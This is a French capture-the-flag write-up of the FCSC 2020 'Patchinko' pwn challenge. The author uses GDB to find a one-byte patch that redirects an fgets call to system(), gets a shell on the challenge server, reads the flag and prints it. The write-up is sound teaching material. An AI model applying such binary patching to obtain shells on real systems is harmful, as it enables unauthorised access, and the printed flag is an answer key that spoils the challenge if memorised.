<center><h1>FCSC 2020 - Patchinko Writeup</h1></center>

<br>
<br>
<br>

<img src="https://img.onii.wtf/i/rd6a0.png">

<br>

Très bien, nous nous retrouvons avec un beau challenge de pwn.

Nous remarquons déjà dans l'énoncé la présence d'une commande qui nous permet de nous connecter à un serveur et un binaire "patchinko.bin"
<br>

```
mizaru@DESKTOP-23T8VRF:/mnt/c/Users/sMizaru/Downloads$ file patchinko.bin                                               
patchinko.bin: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=ea28c1aa273a99a5c9323b062e3277734bbed0be, not stripped
```

Après avoir téléchargé le binaire, on tombe sur un binaire dynamiquement lié, non strippé. Essayons dans un premier temps de voir le retour d'un strings sur celui-ci (je vais vous mettre que les éléments intéressants) :

```
echo Hello! Welcome to Patchinko Gambling Machine.                                                                      
Is this your first time here? [y/n]                                                                                     
>>>                                                                                                                     
Welcome back then!                                                                                                      
Welcome among us! What is your name?                                                                                    
>>>                                                                                                                     
Nice to meet you %s!                                                                                                    
Guess my number
```

Testons donc de lancer notre binaire ! 

```
mizaru@DESKTOP-23T8VRF:/mnt/c/Users/sMizaru/Downloads$ ./patchinko.bin                                                  
Hello! Welcome to Patchinko Gambling Machine.                                                                           
Is this your first time here? [y/n]                                                                                     
>>> y                                                                                                                   
Welcome among us! What is your name?                                                                                    
>>> Mizaru                                                                                                              
Nice to meet you Mizaru!                                                                                                
Guess my number                                                                                                         
3147151366091887426                                                                                                     AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA                  
Close but no! It was 3147151366091887426. Try again!
```
<br>

Très bien, on y voit déjà plus clair sur le fonctionnement de notre binaire, plongeons plus en profondeur et allons l'analyser de plus prêt.

<br>

Je vais utiliser GDB pour ce challenge, car pas besoin d'utiliser IDA pour voir comment il fonctionne.
Desassemblons dans un premier temps la fonction "main" (je vais encore une fois vous montrer les éléments les plus intéressant) :

```
 0x0000000000400853 <+45>:    call   0x4006d0 <system@plt>
 0x000000000040087c <+86>:    call   0x4006f0 <fgets@plt>
 0x00000000004008e2 <+188>:   call   0x4006f0 <fgets@plt>
```

Trois call très intéressant, dont un call vers la fonction system().

<br>

Observons ça de plus prêt et plaçons un breakpoint avant l'appel vers cette fameuse fonction system() : 
```
pwndbg> b*main+38                                                                                                       
Breakpoint 1 at 0x40084c 
```
Et voici après execution du programme ce que nous retourne GDB:
```
 0x40084c <main+38>    lea    rdi, [rip + 0x205]                                                                       
 ► 0x400853 <main+45>    call   system@plt <0x4006d0>                                                                           
 command: 0x400a58 ◂— 'echo Hello! Welcome to Patchinko Gambling Machine.'
 ```

 Nous voyons déjà plus clair sur ce que contient system, qui n'est autre que `system('echo Hello! Welcome to Patchinko Gambling Machine.')`.

 Tournons nous maintenant vers le serveur qui a été donné dans l'énoncé.
 <br>
 <br>

 ```
 mizaru@DESKTOP-23T8VRF:/mnt/c/Users/sMizaru/Downloads$ nc challenges1.france-cybersecurity-challenge.fr 4009            
 ================================                                                                                        
 == Patchinko Gambling Machine ==                                                                                        
 ================================                                                                                                              
                                                                                             
 We present you the new version of our Patchinko Gambling Machine!                                                       
 This is a game of chance: you need to guess a 64-bit random number.                                                     
 As we have been told that it is quite hard, we help you.                                                                
 Before the machine executes its code, you can patch *one* byte of its binary.                                           
 Choose wisely!                                                                                                                                        

 At which position do you want to modify (base 16)?                                                                      
 >>>    
 ```

 On remarque déjà un assez gros hint dans le serveur (`you can patch *one* byte of its binary`)
 Ce qui veut dire que le serveur attend qu'on lui entre un byte à modifier, tentons donc de récupérer les bytes de notre fgets et notre system:

```
pwndbg> x/5x 0x0000000000400853                                                                                         
0x400853 <main+45>:     0xe8    0x78    0xfe    0xff    0xff
```
```
pwndbg> x/5b 0x000000000040087c                                                                                         
0x40087c <main+86>:     0xe8    0x6f    0xfe    0xff    0xff  
```

<br>

Très bien, nous voyons qu'en comparant les deux nous n'avons qu'un byte qui change, tentons donc d'entrer le byte de system à changer
```
At which position do you want to modify (base 16)?                                                                      
>>> 78                                                                                                                  
Which byte value do you want to write there (base 16)?                                                                  
>>> 6F                                                                                                                  
== Let's go!                                                                                                            
sh                                                                                                                      
ls   

```

Très bien, aucun shell n'a pop, tentons donc de modifier le byte de fgets() à la place (ce qui est plus logique)
```
At which position do you want to modify (base 16)?                                                                      
>>> 6F                                                                                                                  
Which byte value do you want to write there (base 16)?                                                                  
>>> 78                                                                                                                  
== Let's go!                                                                                                            
Hello! Welcome to Patchinko Gambling Machine.                                                                           
Is this your first time here? [y/n]                                                                                     
>>> ls                                                                                                                  
Is this your first time here? [y/n]                                                                                     
>>> y                                                                                                                   
Welcome among us! What is your name?                                                                                    
>>> ls                                                                                                                  
Nice to meet you ls!                                                                                                    
Guess my number                                                                                                         
-2779294116679768049                                                                                                    
ls                                                                                                                      
Close but no! It was -2779294116679768049. Try again!                                                                   
^C                                                                                                                      
mizaru@DESKTOP-23T8VRF:/mnt/c/Users/sMizaru/Downloads$ 
```

Rien ne change, tentons donc de changer nos bytes : 

```
At which position do you want to modify (base 16)?                                                                      
>>> 889                                                                                                                 
Which byte value do you want to write there (base 16)?                                                                  
>>> 43                                                                                                                  
== Let's go!                                                                                                            
Hello! Welcome to Patchinko Gambling Machine.                                                                           
Is this your first time here? [y/n]                                                                                     
>>> sh                                                                                                                  
ls                                                                                                                      
flag                                                                                                                    
patchinko.bin                                                                                                           
patchinko.py                                                                                                            
cat flag                                                                                                                
FCSC{b4cbc07a77bb0984b994c9e34b2897ab49f08524402c38621a38bc4475102998}
```

Et voilà, Patchinko est donc résolu ! 


Chall plutôt simpliste comparé à Pépin. Un peu de binary patching ne fait jamais de mal x)






